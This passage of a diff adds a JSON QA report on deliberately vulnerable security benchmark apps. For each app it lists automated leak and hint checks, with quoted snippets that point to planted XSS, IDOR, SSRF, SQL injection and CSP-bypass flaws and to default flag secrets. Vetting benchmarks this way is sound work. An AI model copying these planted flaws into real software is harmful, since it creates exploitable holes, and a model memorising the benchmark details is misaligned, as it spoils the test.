+      "benchmark": "S7BEN-HARD-018",
+      "checks": {
+        "flag_hardcoded": {
+          "pass": true,
+          "details": []
+        },
+        "comment_hints": {
+          "pass": true,
+          "details": []
+        },
+        "revealing_identifiers": {
+          "pass": true,
+          "details": []
+        },
+        "docker_compose_healthchecks": {
+          "pass": false,
+          "details": [
+            "No 'healthcheck' found in docker-compose.yml"
+          ]
+        },
+        "dockerfile_flag_arg": {
+          "pass": false,
+          "details": [
+            "app/Dockerfile: ARG flag=no, used=no"
+          ]
+        },
+        "config_description_leak": {
+          "pass": true,
+          "details": []
+        },
+        "direct_flag_access": {
+          "pass": true,
+          "details": []
+        },
+        "app_starts": {
+          "pass": false,
+          "status": "skipped",
+          "details": [
+            "Runtime start check skipped (no Docker in QA sandbox)"
+          ]
+        }
+      }
+    },
+    {
+      "benchmark": "S7BEN-HARD-019",
+      "checks": {
+        "flag_hardcoded": {
+          "pass": true,
+          "details": []
+        },
+        "comment_hints": {
+          "pass": true,
+          "details": []
+        },
+        "revealing_identifiers": {
+          "pass": true,
+          "details": []
+        },
+        "docker_compose_healthchecks": {
+          "pass": false,
+          "details": [
+            "No 'healthcheck' found in docker-compose.yml"
+          ]
+        },
+        "dockerfile_flag_arg": {
+          "pass": false,
+          "details": [
+            "app/Dockerfile: ARG flag=no, used=no"
+          ]
+        },
+        "config_description_leak": {
+          "pass": false,
+          "details": [
+            "No description found in benchmark.yaml"
+          ]
+        },
+        "direct_flag_access": {
+          "pass": true,
+          "details": []
+        },
+        "app_starts": {
+          "pass": false,
+          "status": "skipped",
+          "details": [
+            "Runtime start check skipped (no Docker in QA sandbox)"
+          ]
+        }
+      }
+    },
+    {
+      "benchmark": "S7BEN-MED-001",
+      "checks": {
+        "flag_hardcoded": {
+          "pass": true,
+          "details": []
+        },
+        "comment_hints": {
+          "pass": false,
+          "details": [
+            {
+              "file": "app/templates/login.html",
+              "line": 93,
+              "snippet": "<!-- Exploitation Info -->"
+            }
+          ]
+        },
+        "revealing_identifiers": {
+          "pass": false,
+          "details": [
+            {
+              "file": "app/app.py",
+              "line": 24,
+              "identifier_like": "sqlite3",
+              "snippet": "conn = sqlite3.connect(DB_FILE, timeout=10)"
+            },
+            {
+              "file": "app/app.py",
+              "line": 25,
+              "identifier_like": "sqlite3",
+              "snippet": "conn.row_factory = sqlite3.Row"
+            },
+            {
+              "file": "app/templates/index.html",
+              "line": 67,
+              "identifier_like": "exploitation",
+              "snippet": "<h3 class=\"font-semibold text-blue-800 mb-2\">💡 Exploitation Hint:</h3>"
+            },
+            {
+              "file": "app/templates/login.html",
+              "line": 95,
+              "identifier_like": "exploitation",
+              "snippet": "<h3 class=\"font-semibold text-gray-800 mb-3\">🎯 Exploitation Steps:</h3>"
+            },
+            {
+              "file": "app/templates/login.html",
+              "line": 100,
+              "identifier_like": "exploitation",
+              "snippet": "<li>Call <code class=\"bg-gray-100 px-2 py-1 rounded text-xs\">POST /api/verify-hijack</code> to prove exploitation and get flag</li>"
+            },
+            {
+              "file": "app/templates/dashboard.html",
+              "line": 111,
+              "identifier_like": "overflow-x-auto",
+              "snippet": "<pre class=\"bg-gray-900 text-green-400 p-4 rounded-lg overflow-x-auto text-xs\"></pre>"
+            },
+            {
+              "file": "app/templates/dashboard.html",
+              "line": 137,
+              "identifier_like": "exploitation",
+              "snippet": "<h4 class=\"font-bold text-green-800 mb-2\">✅ Exploitation Successful!</h4>"
+            }
+          ]
+        },
+        "docker_compose_healthchecks": {
+          "pass": true,
+          "details": []
+        },
+        "dockerfile_flag_arg": {
+          "pass": false,
+          "details": [
+            "app/Dockerfile: ARG flag=no, used=no"
+          ]
+        },
+        "config_description_leak": {
+          "pass": true,
+          "details": []
+        },
+        "direct_flag_access": {
+          "pass": true,
+          "details": []
+        },
+        "app_starts": {
+          "pass": false,
+          "status": "skipped",
+          "details": [
+            "Runtime start check skipped (no Docker in QA sandbox)"
+          ]
+        }
+      }
+    },
+    {
+      "benchmark": "S7BEN-MED-002",
+      "checks": {
+        "flag_hardcoded": {
+          "pass": true,
+          "details": []
+        },
+        "comment_hints": {
+          "pass": false,
+          "details": [
+            {
+              "file": "app/app.py",
+              "line": 64,
+              "snippet": "# Check for path traversal"
+            },
+            {
+              "file": "app/app.py",
+              "line": 118,
+              "snippet": "# Generate dynamic flag as proof of exploitation"
+            }
+          ]
+        },
+        "revealing_identifiers": {
+          "pass": false,
+          "details": [
+            {
+              "file": "app/templates/index.html",
+              "line": 88,
+              "identifier_like": "exploitation",
+              "snippet": "<h3 class=\"text-lg font-semibold text-gray-800 mb-4\">🎯 Exploitation Strategy</h3>"
+            },
+            {
+              "file": "app/templates/index.html",
+              "line": 232,
+              "identifier_like": "exploitation",
+              "snippet": "<h4 class=\"text-lg font-bold text-green-800 mb-2\">🎉 TOCTOU EXPLOITATION SUCCESSFUL!</h4>"
+            }
+          ]
+        },
+        "docker_compose_healthchecks": {
+          "pass": true,
+          "details": []
+        },
+        "dockerfile_flag_arg": {
+          "pass": false,
+          "details": [
+            "app/Dockerfile: ARG flag=no, used=no"
+          ]
+        },
+        "config_description_leak": {
+          "pass": true,
+          "details": []
+        },
+        "direct_flag_access": {
+          "pass": true,
+          "details": []
+        },
+        "app_starts": {
+          "pass": false,
+          "status": "skipped",
+          "details": [
+            "Runtime start check skipped (no Docker in QA sandbox)"
+          ]
+        }
+      }
+    },
+    {
+      "benchmark": "S7BEN-MED-003",
+      "checks": {
+        "flag_hardcoded": {
+          "pass": true,
+          "details": []
+        },
+        "comment_hints": {
+          "pass": false,
+          "details": [
+            {
+              "file": "app/app.py",
+              "line": 244,
+              "snippet": "# Track potential SQLi attempts"
+            },
+            {
+              "file": "app/app.py",
+              "line": 263,
+              "snippet": "# Check for UNION injection success (reveals users table)"
+            }
+          ]
+        },
+        "revealing_identifiers": {
+          "pass": false,
+          "details": [
+            {
+              "file": "docker-compose.yml",
+              "line": 10,
+              "identifier_like": "strike7-sqli-t2-secret-key",
+              "snippet": "- FLAG_SECRET=strike7-sqli-t2-secret-key"
+            },
+            {
+              "file": "app/app.py",
+              "line": 25,
+              "identifier_like": "strike7-sqli-t2-secret-key",
+              "snippet": "FLAG_SECRET = os.environ.get('FLAG_SECRET', 'strike7-sqli-t2-secret-key')"
+            },
+            {
+              "file": "app/app.py",
+              "line": 30,
+              "identifier_like": "sqlite3",
+              "snippet": "conn = sqlite3.connect(DB_PATH)"
+            },
+            {
+              "file": "app/app.py",
+              "line": 31,
+              "identifier_like": "sqlite3",
+              "snippet": "conn.row_factory = sqlite3.Row"
+            },
+            {
+              "file": "app/app.py",
+              "line": 129,
+              "identifier_like": "sqli_t2",
+              "snippet": "data = f\"sqli_t2:{password[:8]}:{timestamp}\""
+            },
+            {
+              "file": "app/app.py",
+              "line": 246,
+              "identifier_like": "sqli_attempts",
+              "snippet": "state['telemetry']['sqli_attempts'] += 1"
+            },
+            {
+              "file": "app/app.py",
+              "line": 268,
+              "identifier_like": "sqli_successful",
+              "snippet": "state['sqli_successful'] = True"
+            },
+            {
+              "file": "app/templates/index.html",
+              "line": 51,
+              "identifier_like": "overflow-auto",
+              "snippet": "<pre id=\"data-output\" class=\"bg-gray-50 rounded p-4 overflow-auto max-h-96 text-sm\">"
+            }
+          ]
+        },
+        "docker_compose_healthchecks": {
+          "pass": true,
+          "details": []
+        },
+        "dockerfile_flag_arg": {
+          "pass": false,
+          "details": [
+            "app/Dockerfile: ARG flag=no, used=no"
+          ]
+        },
+        "config_description_leak": {
+          "pass": true,
+          "details": []
+        },
+        "direct_flag_access": {
+          "pass": true,
+          "details": []
+        },
+        "app_starts": {
+          "pass": false,
+          "status": "skipped",
+          "details": [
+            "Runtime start check skipped (no Docker in QA sandbox)"
+          ]
+        }
+      }
+    },
+    {
+      "benchmark": "S7BEN-MED-004",
+      "checks": {
+        "flag_hardcoded": {
+          "pass": true,
+          "details": []
+        },
+        "comment_hints": {
+          "pass": false,
+          "details": [
+            {
+              "file": "app/app.py",
+              "line": 100,
+              "snippet": "# Set admin session cookie (not httpOnly - vulnerable to XSS theft)"
+            },
+            {
+              "file": "app/app.py",
+              "line": 132,
+              "snippet": "# Support GET for simpler exploitation"
+            },
+            {
+              "file": "app/templates/index.html",
+              "line": 41,
+              "snippet": "<!-- VULNERABLE: DOM-based XSS sink -->"
+            },
+            {
+              "file": "app/templates/index.html",
+              "line": 70,
+              "snippet": "// VULNERABLE CODE - DOM-based XSS"
+            }
+          ]
+        },
+        "revealing_identifiers": {
+          "pass": false,
+          "details": [
+            {
+              "file": "Makefile",
+              "line": 4,
+              "identifier_like": "strike7-dom-xss-t2-secret",
+              "snippet": "FLAG_SECRET ?= strike7-dom-xss-t2-secret"
+            },
+            {
+              "file": "docker-compose.yml",
+              "line": 10,
+              "identifier_like": "-strike7-dom-xss-t2-secret",
+              "snippet": "- FLAG_SECRET=${FLAG_SECRET:-strike7-dom-xss-t2-secret}"
+            },
+            {
+              "file": "app/app.py",
+              "line": 29,
+              "identifier_like": "strike7-dom-xss-t2-secret",
+              "snippet": "FLAG_SECRET = os.environ.get('FLAG_SECRET', 'strike7-dom-xss-t2-secret')"
+            },
+            {
+              "file": "app/app.py",
+              "line": 80,
+              "identifier_like": "dom_xss_session_theft",
+              "snippet": "data = f\"dom_xss_session_theft:{session_id}:{username}:{timestamp}\""
+            },
+            {
+              "file": "app/app.py",
+              "line": 144,
+              "identifier_like": "xss_triggered",
+              "snippet": "state['xss_triggered'] = True"
+            },
+            {
+              "file": "app/templates/victim.html",
+              "line": 27,
+              "identifier_like": "exploitation",
+              "snippet": "<h2 class=\"text-2xl font-bold mb-4\">Exploitation Scenario</h2>"
+            },
+            {
+              "file": "app/templates/victim.html",
+              "line": 37,
+              "identifier_like": "xss",
+              "snippet": "<p class=\"text-white/60 mb-1\">Basic XSS:</p>"
+            }
+          ]
+        },
+        "docker_compose_healthchecks": {
+          "pass": true,
+          "details": []
+        },
+        "dockerfile_flag_arg": {
+          "pass": false,
+          "details": [
+            "app/Dockerfile: ARG flag=no, used=no"
+          ]
+        },
+        "config_description_leak": {
+          "pass": true,
+          "details": []
+        },
+        "direct_flag_access": {
+          "pass": true,
+          "details": []
+        },
+        "app_starts": {
+          "pass": false,
+          "status": "skipped",
+          "details": [
+            "Runtime start check skipped (no Docker in QA sandbox)"
+          ]
+        }
+      }
+    },
+    {
+      "benchmark": "S7BEN-MED-005",
+      "checks": {
+        "flag_hardcoded": {
+          "pass": true,
+          "details": []
+        },
+        "comment_hints": {
+          "pass": false,
+          "details": [
+            {
+              "file": "app/app.py",
+              "line": 229,
+              "snippet": "# Return document regardless of ownership (IDOR!)"
+            },
+            {
+              "file": "app/templates/index.html",
+              "line": 186,
+              "snippet": "// Show/hide IDOR warning"
+            }
+          ]
+        },
+        "revealing_identifiers": {
+          "pass": false,
+          "details": [
+            {
+              "file": "Makefile",
+              "line": 4,
+              "identifier_like": "strike7-uuid-idor-t2-secret",
+              "snippet": "FLAG_SECRET ?= strike7-uuid-idor-t2-secret"
+            },
+            {
+              "file": "docker-compose.yml",
+              "line": 10,
+              "identifier_like": "-strike7-uuid-idor-t2-secret",
+              "snippet": "- FLAG_SECRET=${FLAG_SECRET:-strike7-uuid-idor-t2-secret}"
+            },
+            {
+              "file": "app/app.py",
+              "line": 31,
+              "identifier_like": "strike7-idor-secret-key-temp",
+              "snippet": "app.secret_key = os.environ.get('SECRET_KEY', 'strike7-idor-secret-key-temp')"
+            },
+            {
+              "file": "app/app.py",
+              "line": 32,
+              "identifier_like": "strike7-uuid-idor-t2-secret",
+              "snippet": "FLAG_SECRET = os.environ.get('FLAG_SECRET', 'strike7-uuid-idor-t2-secret')"
+            },
+            {
+              "file": "app/app.py",
+              "line": 125,
+              "identifier_like": "uuid_idor",
+              "snippet": "data = f\"uuid_idor:{document_id}:{owner}:{timestamp}\""
+            },
+            {
+              "file": "app/app.py",
+              "line": 222,
+              "identifier_like": "idor_exploited",
+              "snippet": "state['idor_exploited'] = True"
+            },
+            {
+              "file": "app/templates/index.html",
+              "line": 67,
+              "identifier_like": "idorwarning",
+              "snippet": "<div id=\"idorWarning\" class=\"hidden mt-4 p-4 bg-yellow-50 border border-yellow-200 rounded-lg\">"
+            },
+            {
+              "file": "app/templates/index.html",
+              "line": 125,
+              "identifier_like": "overflow-x-auto",
+              "snippet": "<div class=\"overflow-x-auto\">"
+            },
+            {
+              "file": "app/templates/index.html",
+              "line": 177,
+              "identifier_like": "idor_detected",
+              "snippet": "const isUnauthorized = data.idor_detected || false;"
+            },
+            {
+              "file": "app/templates/index.html",
+              "line": 187,
+              "identifier_like": "idorwarning",
+              "snippet": "const warningDiv = document.getElementById('idorWarning');"
+            }
+          ]
+        },
+        "docker_compose_healthchecks": {
+          "pass": true,
+          "details": []
+        },
+        "dockerfile_flag_arg": {
+          "pass": false,
+          "details": [
+            "app/Dockerfile: ARG flag=no, used=no"
+          ]
+        },
+        "config_description_leak": {
+          "pass": true,
+          "details": []
+        },
+        "direct_flag_access": {
+          "pass": true,
+          "details": []
+        },
+        "app_starts": {
+          "pass": false,
+          "status": "skipped",
+          "details": [
+            "Runtime start check skipped (no Docker in QA sandbox)"
+          ]
+        }
+      }
+    },
+    {
+      "benchmark": "S7BEN-MED-006",
+      "checks": {
+        "flag_hardcoded": {
+          "pass": true,
+          "details": []
+        },
+        "comment_hints": {
+          "pass": false,
+          "details": [
+            {
+              "file": "benchmark.yaml",
+              "line": 41,
+              "snippet": "exploration_complexity: 3  # Must discover log injection + admin panel"
+            },
+            {
+              "file": "benchmark.yaml",
+              "line": 42,
+              "snippet": "reasoning_complexity: 4    # Chain log injection → XSS → session theft"
+            },
+            {
+              "file": "benchmark.yaml",
+              "line": 43,
+              "snippet": "bypass_depth: 1            # No sanitization bypass needed"
+            },
+            {
+              "file": "benchmark.yaml",
+              "line": 44,
+              "snippet": "chain_length: 3            # Inject → Store → Execute in admin context"
+            },
+            {
+              "file": "app/app.py",
+              "line": 194,
+              "snippet": "# Detect XSS patterns for telemetry"
+            },
+            {
+              "file": "app/app.py",
+              "line": 281,
+              "snippet": "# Check if logs contain XSS payload"
+            },
+            {
+              "file": "app/templates/logs.html",
+              "line": 95,
+              "snippet": "{# This allows stored XSS via log injection #}"
+            }
+          ]
+        },
+        "revealing_identifiers": {
+          "pass": false,
+          "details": [
+            {
+              "file": "Makefile",
+              "line": 4,
+              "identifier_like": "strike7-log-injection-t2-secret",
+              "snippet": "FLAG_SECRET ?= strike7-log-injection-t2-secret"
+            },
+            {
+              "file": "docker-compose.yml",
+              "line": 10,
+              "identifier_like": "-strike7-log-injection-t2-secret",
+              "snippet": "- FLAG_SECRET=${FLAG_SECRET:-strike7-log-injection-t2-secret}"
+            },
+            {
+              "file": "app/app.py",
+              "line": 30,
+              "identifier_like": "strike7-log-xss-secret-key-temp",
+              "snippet": "app.secret_key = os.environ.get('SECRET_KEY', 'strike7-log-xss-secret-key-temp')"
+            },
+            {
+              "file": "app/app.py",
+              "line": 31,
+              "identifier_like": "strike7-log-injection-t2-secret",
+              "snippet": "FLAG_SECRET = os.environ.get('FLAG_SECRET', 'strike7-log-injection-t2-secret')"
+            },
+            {
+              "file": "app/app.py",
+              "line": 102,
+              "identifier_like": "detect_xss_pattern",
+              "snippet": "def detect_xss_pattern(text):"
+            },
+            {
+              "file": "app/app.py",
+              "line": 104,
+              "identifier_like": "xss_indicators",
+              "snippet": "xss_indicators = ["
+            },
+            {
+              "file": "app/app.py",
+              "line": 117,
+              "identifier_like": "injection_point",
+              "snippet": "def generate_flag(injection_point, xss_context):"
+            },
+            {
+              "file": "app/app.py",
+              "line": 120,
+              "identifier_like": "log_xss_chain",
+              "snippet": "data = f\"log_xss_chain:{injection_point}:{xss_context}:{timestamp}\""
+            },
+            {
+              "file": "app/app.py",
+              "line": 196,
+              "identifier_like": "xss_payloads_detected",
+              "snippet": "state['telemetry']['xss_payloads_detected'] += 1"
+            },
+            {
+              "file": "app/app.py",
+              "line": 197,
+              "identifier_like": "log_injection_detected",
+              "snippet": "state['log_injection_detected'] = True"
+            },
+            {
+              "file": "app/app.py",
+              "line": 259,
+              "identifier_like": "xss_triggered",
+              "snippet": "state['xss_triggered'] = True"
+            },
+            {
+              "file": "app/app.py",
+              "line": 282,
+              "identifier_like": "has_xss",
+              "snippet": "has_xss = any(detect_xss_pattern(log.get('message', '')) for log in APP_LOGS)"
+            },
+            {
+              "file": "app/app.py",
+              "line": 285,
+              "identifier_like": "xss_triggered",
+              "snippet": "state['xss_triggered'] = True"
+            },
+            {
+              "file": "app/app.py",
+              "line": 370,
+              "identifier_like": "xss",
+              "snippet": "\"hint\": \"User input in logs + HTML rendering without escaping = stored XSS\","
+            },
+            {
+              "file": "app/templates/logs.html",
+              "line": 61,
+              "identifier_like": "overflow-x-auto",
+              "snippet": "<div class=\"overflow-x-auto\">"
+            }
+          ]
+        },
+        "docker_compose_healthchecks": {
+          "pass": true,
+          "details": []
+        },
+        "dockerfile_flag_arg": {
+          "pass": false,
+          "details": [
+            "app/Dockerfile: ARG flag=no, used=no"
+          ]
+        },
+        "config_description_leak": {
+          "pass": true,
+          "details": []
+        },
+        "direct_flag_access": {
+          "pass": true,
+          "details": []
+        },
+        "app_starts": {
+          "pass": false,
+          "status": "skipped",
+          "details": [
+            "Runtime start check skipped (no Docker in QA sandbox)"
+          ]
+        }
+      }
+    },
+    {
+      "benchmark": "S7BEN-MED-007",
+      "checks": {
+        "flag_hardcoded": {
+          "pass": true,
+          "details": []
+        },
+        "comment_hints": {
+          "pass": false,
+          "details": [
+            {
+              "file": "app/app.py",
+              "line": 230,
+              "snippet": "# Generate flag for successful exploit"
+            },
+            {
+              "file": "app/templates/index.html",
+              "line": 81,
+              "snippet": "<!-- Exploitation Hint -->"
+            },
+            {
+              "file": "app/templates/dashboard.html",
+              "line": 70,
+              "snippet": "<!-- Exploitation Tools -->"
+            }
+          ]
+        },
+        "revealing_identifiers": {
+          "pass": false,
+          "details": [
+            {
+              "file": "app/templates/index.html",
+              "line": 83,
+              "identifier_like": "exploitation",
+              "snippet": "<h3 class=\"text-lg font-semibold text-gray-800 mb-4\">🎯 Exploitation Strategy</h3>"
+            },
+            {
+              "file": "app/templates/dashboard.html",
+              "line": 102,
+              "identifier_like": "overflow-y-auto",
+              "snippet": "<div class=\"bg-white rounded-lg shadow-xl max-w-2xl w-full max-h-[80vh] overflow-y-auto\">"
+            },
+            {
+              "file": "app/templates/dashboard.html",
+              "line": 162,
+              "identifier_like": "exploitation",
+              "snippet": "<strong class=\"text-green-800\">🎉 Exploitation Successful!</strong>"
+            }
+          ]
+        },
+        "docker_compose_healthchecks": {
+          "pass": true,
+          "details": []
+        },
+        "dockerfile_flag_arg": {
+          "pass": false,
+          "details": [
+            "app/Dockerfile: ARG flag=no, used=no"
+          ]
+        },
+        "config_description_leak": {
+          "pass": true,
+          "details": []
+        },
+        "direct_flag_access": {
+          "pass": true,
+          "details": []
+        },
+        "app_starts": {
+          "pass": false,
+          "status": "skipped",
+          "details": [
+            "Runtime start check skipped (no Docker in QA sandbox)"
+          ]
+        }
+      }
+    },
+    {
+      "benchmark": "S7BEN-MED-008",
+      "checks": {
+        "flag_hardcoded": {
+          "pass": true,
+          "details": []
+        },
+        "comment_hints": {
+          "pass": true,
+          "details": []
+        },
+        "revealing_identifiers": {
+          "pass": true,
+          "details": []
+        },
+        "docker_compose_healthchecks": {
+          "pass": true,
+          "details": []
+        },
+        "dockerfile_flag_arg": {
+          "pass": true,
+          "details": [
+            "app/Dockerfile: ARG flag=yes, used=yes"
+          ]
+        },
+        "config_description_leak": {
+          "pass": true,
+          "details": []
+        },
+        "direct_flag_access": {
+          "pass": true,
+          "details": []
+        },
+        "app_starts": {
+          "pass": false,
+          "status": "skipped",
+          "details": [
+            "Runtime start check skipped (no Docker in QA sandbox)"
+          ]
+        }
+      }
+    },
+    {
+      "benchmark": "S7BEN-MED-009",
+      "checks": {
+        "flag_hardcoded": {
+          "pass": true,
+          "details": []
+        },
+        "comment_hints": {
+          "pass": false,
+          "details": [
+            {
+              "file": "benchmark.yaml",
+              "line": 9,
+              "snippet": "- CWE-79   # Cross-site Scripting (XSS)"
+            },
+            {
+              "file": "app/app.py",
+              "line": 97,
+              "snippet": "# Blocks obvious XSS attempts"
+            },
+            {
+              "file": "app/app.py",
+              "line": 145,
+              "snippet": "# Support GET for simpler exploitation"
+            },
+            {
+              "file": "app/templates/index.html",
+              "line": 108,
+              "snippet": "<!-- Exploitation Hint -->"
+            },
+            {
+              "file": "app/templates/search.html",
+              "line": 74,
+              "snippet": "<!-- Exploitation Hint -->"
+            }
+          ]
+        },
+        "revealing_identifiers": {
+          "pass": false,
+          "details": [
+            {
+              "file": "app/app.py",
+              "line": 42,
+              "identifier_like": "csp_bypass",
+              "snippet": "data = f\"csp_bypass:{session_id}:{victim_username}:{attack_method}:{timestamp}\""
+            },
+            {
+              "file": "app/app.py",
+              "line": 154,
+              "identifier_like": "csp_bypass",
+              "snippet": "method = data.get('method', 'csp_bypass')"
+            },
+            {
+              "file": "app/app.py",
+              "line": 175,
+              "identifier_like": "/api/verify-exploit",
+              "snippet": "@app.route('/api/verify-exploit', methods=['POST'])"
+            },
+            {
+              "file": "app/app.py",
+              "line": 176,
+              "identifier_like": "verify_exploit",
+              "snippet": "def verify_exploit():"
+            },
+            {
+              "file": "app/templates/index.html",
+              "line": 83,
+              "identifier_like": "overflow-x-auto",
+              "snippet": "<div class=\"bg-gray-50 p-4 rounded font-mono text-xs overflow-x-auto\">"
+            },
+            {
+              "file": "app/templates/index.html",
+              "line": 110,
+              "identifier_like": "exploitation",
+              "snippet": "<h3 class=\"text-lg font-semibold text-gray-800 mb-4\">🎯 Exploitation Strategy</h3>"
+            },
+            {
+              "file": "app/templates/index.html",
+              "line": 113,
+              "identifier_like": "xss",
+              "snippet": "<strong>Step 1:</strong> Find reflected XSS in /search?q= parameter"
+            },
+            {
+              "file": "app/templates/search.html",
+              "line": 76,
+              "identifier_like": "xss",
+              "snippet": "<h3 class=\"text-lg font-semibold text-gray-800 mb-3\">🔍 Testing for XSS</h3>"
+            },
+            {
+              "file": "app/templates/search.html",
+              "line": 92,
+              "identifier_like": "bypass",
+              "snippet": "<br><span class=\"text-gray-600 text-xs\">→ Bypass CSP with whitelisted library</span>"
+            },
+            {
+              "file": "app/templates/victim.html",
+              "line": 38,
+              "identifier_like": "exploitation",
+              "snippet": "<h2 class=\"text-xl font-semibold text-gray-800 mb-4\">Exploitation Scenario</h2>"
+            },
+            {
+              "file": "app/templates/victim.html",
+              "line": 76,
+              "identifier_like": "xss",
+              "snippet": "<p class=\"text-xs text-gray-700 mb-2\"><strong>Basic XSS (Blocked by CSP):</strong></p>"
+            },
+            {
+              "file": "app/templates/victim.html",
+              "line": 86,
+              "identifier_like": "bypass",
+              "snippet": "<p class=\"text-xs text-gray-700 mb-2\"><strong>CSP Bypass with AngularJS:</strong></p>"
+            },
+            {
+              "file": "app/templates/victim.html",
+              "line": 113,
+              "identifier_like": "overflow-y-auto",
+              "snippet": "<div class=\"bg-white rounded-lg shadow-xl max-w-2xl w-full max-h-[80vh] overflow-y-auto\">"
+            }
+          ]
+        },
+        "docker_compose_healthchecks": {
+          "pass": true,
+          "details": []
+        },
+        "dockerfile_flag_arg": {
+          "pass": false,
+          "details": [
+            "app/Dockerfile: ARG flag=no, used=no"
+          ]
+        },
+        "config_description_leak": {
+          "pass": true,
+          "details": []
+        },
+        "direct_flag_access": {
+          "pass": true,
+          "details": []
+        },
+        "app_starts": {
+          "pass": false,
+          "status": "skipped",
+          "details": [
+            "Runtime start check skipped (no Docker in QA sandbox)"
+          ]
+        }
+      }
+    },
+    {
+      "benchmark": "S7BEN-MED-010",
+      "checks": {
+        "flag_hardcoded": {
+          "pass": true,
+          "details": []
+        },
+        "comment_hints": {
+          "pass": false,
+          "details": [
+            {
+              "file": "benchmark.yaml",
+              "line": 9,
+              "snippet": "- CWE-918  # Server-Side Request Forgery (SSRF)"
+            },
+            {
+              "file": "app/app.py",
+              "line": 125,
+              "snippet": "# Apply SSRF filter"
+            },
+            {
+              "file": "app/templates/index.html",
+              "line": 105,
+              "snippet": "<!-- SSRF Filter Info -->"
+            },
+            {
+              "file": "app/templates/index.html",
+              "line": 122,
+              "snippet": "<!-- Exploitation Hint -->"
+            }
+          ]
+        },
+        "revealing_identifiers": {
+          "pass": false,
+          "details": [
+            {
+              "file": "Makefile",
+              "line": 4,
+              "identifier_like": "strike7-ssrf-secret-key",
+              "snippet": "FLAG_SECRET ?= strike7-ssrf-secret-key"
+            },
+            {
+              "file": "docker-compose.yml",
+              "line": 10,
+              "identifier_like": "-strike7-ssrf-secret-key",
+              "snippet": "- FLAG_SECRET=${FLAG_SECRET:-strike7-ssrf-secret-key}"
+            },
+            {
+              "file": "docker-compose.yml",
+              "line": 31,
+              "identifier_like": "-strike7-ssrf-secret-key",
+              "snippet": "- FLAG_SECRET=${FLAG_SECRET:-strike7-ssrf-secret-key}"
+            },
+            {
+              "file": "app/app.py",
+              "line": 27,
+              "identifier_like": "strike7-ssrf-secret-key",
+              "snippet": "FLAG_SECRET = os.environ.get('FLAG_SECRET', 'strike7-ssrf-secret-key')"
+            },
+            {
+              "file": "app/app.py",
+              "line": 33,
+              "identifier_like": "source_ip",
+              "snippet": "def generate_flag(metadata_token, source_ip):"
+            },
+            {
+              "file": "app/app.py",
+              "line": 36,
+              "identifier_like": "ssrf_metadata_bypass",
+              "snippet": "data = f\"ssrf_metadata_bypass:{metadata_token}:{source_ip}:{timestamp}\""
+            },
+            {
+              "file": "app/templates/index.html",
+              "line": 107,
+              "identifier_like": "ssrf",
+              "snippet": "<h3 class=\"text-lg font-semibold text-gray-800 mb-4\">SSRF Protection Details</h3>"
+            },
+            {
+              "file": "app/templates/index.html",
+              "line": 124,
+              "identifier_like": "exploitation",
+              "snippet": "<h3 class=\"text-lg font-semibold text-gray-800 mb-4\">🎯 Exploitation Strategy</h3>"
+            },
+            {
+              "file": "app/templates/index.html",
+              "line": 152,
+              "identifier_like": "overflow-y-auto",
+              "snippet": "<div class=\"bg-white rounded-lg shadow-xl max-w-4xl w-full max-h-[80vh] overflow-y-auto\">"
+            },
+            {
+              "file": "app/templates/index.html",
+              "line": 198,
+              "identifier_like": "overflow-x-auto",
+              "snippet": "<pre class=\"mt-2 p-2 bg-white rounded text-xs overflow-x-auto\">${escapeHtml(data.content)}</pre>"
+            },
+            {
+              "file": "metadata-service/app.py",
+              "line": 16,
+              "identifier_like": "strike7-ssrf-secret-key",
+              "snippet": "FLAG_SECRET = os.environ.get('FLAG_SECRET', 'strike7-ssrf-secret-key')"
+            }
+          ]
+        },
+        "docker_compose_healthchecks": {
+          "pass": true,
+          "details": []
+        },
+        "dockerfile_flag_arg": {
+          "pass": false,
+          "details": [
+            "app/Dockerfile: ARG flag=no, used=no",
+            "metadata-service/Dockerfile: ARG flag=no, used=no"
+          ]
+        },
+        "config_description_leak": {
+          "pass": true,
+          "details": []
+        },
+        "direct_flag_access": {
+          "pass": true,
+          "details": []
+        },
+        "app_starts": {
+          "pass": false,
+          "status": "skipped",
+          "details": [
+            "Runtime start check skipped (no Docker in QA sandbox)"
+          ]
+        }
+      }
+    },
+    {
+      "benchmark": "S7BEN-MED-011",
+      "checks": {
+        "flag_hardcoded": {
+          "pass": true,
+          "details": []
+        },
+        "comment_hints": {
+          "pass": false,
+          "details": [
+            {
+              "file": "app/app.py",
+              "line": 133,
+              "snippet": "# ROUTES - REALISTIC E-COMMERCE UI (No hints!)"
+            }
+          ]
+        },
+        "revealing_identifiers": {
+          "pass": false,
+          "details": [
+            {
+              "file": "app/templates/index.html",
+              "line": 83,
+              "identifier_like": "overflow-auto",
+              "snippet": "<pre id=\"response-content\" class=\"bg-gray-100 rounded p-4 text-sm overflow-auto max-h-96\"></pre>"
+            }
+          ]
+        },
+        "docker_compose_healthchecks": {
+          "pass": true,
+          "details": []
+        },
+        "dockerfile_flag_arg": {
+          "pass": false,
+          "details": [
+            "app/Dockerfile: ARG flag=no, used=no"
+          ]
+        },
+        "config_description_leak": {
+          "pass": true,
+          "details": []
+        },
+        "direct_flag_access": {
+          "pass": true,
+          "details": []
+        },
+        "app_starts": {
+          "pass": false,
+          "status": "skipped",
+          "details": [
+            "Runtime start check skipped (no Docker in QA sandbox)"
+          ]
+        }
+      }
+    },
+    {
+      "benchmark": "S7BEN-MED-012",
+      "checks": {
+        "flag_hardcoded": {
+          "pass": true,
+          "details": []
+        },
+        "comment_hints": {
+          "pass": false,
+          "details": [
+            {
+              "file": "Makefile",
+              "line": 31,
+              "snippet": "# Clean up Docker resources"
+            },
+            {
+              "file": "app/app.py",
+              "line": 361,
+              "snippet": "\"stealth_score\": 100,  # Not enforced in T2"
+            }
+          ]
+        },
+        "revealing_identifiers": {
+          "pass": false,
+          "details": [
+            {
+              "file": "app/templates/index.html",
+              "line": 93,
+              "identifier_like": "overflow-y-auto",
+              "snippet": "class=\"bg-slate-900 rounded p-4 h-48 overflow-y-auto font-mono text-sm text-slate-400\">"
+            }
+          ]
+        },
+        "docker_compose_healthchecks": {
+          "pass": true,
+          "details": []
+        },
+        "dockerfile_flag_arg": {
+          "pass": false,
+          "details": [
+            "mock-registry/Dockerfile: ARG flag=no, used=no",
+            "app/Dockerfile: ARG flag=no, used=no"
+          ]
+        },
+        "config_description_leak": {
+          "pass": true,
+          "details": []
+        },
+        "direct_flag_access": {
+          "pass": true,
+          "details": []
+        },
+        "app_starts": {
+          "pass": false,
+          "status": "skipped",
+          "details": [
+            "Runtime start check skipped (no Docker in QA sandbox)"
+          ]
+        }
+      }
+    },
+    {
+      "benchmark": "S7BEN-MED-013",
+      "checks": {
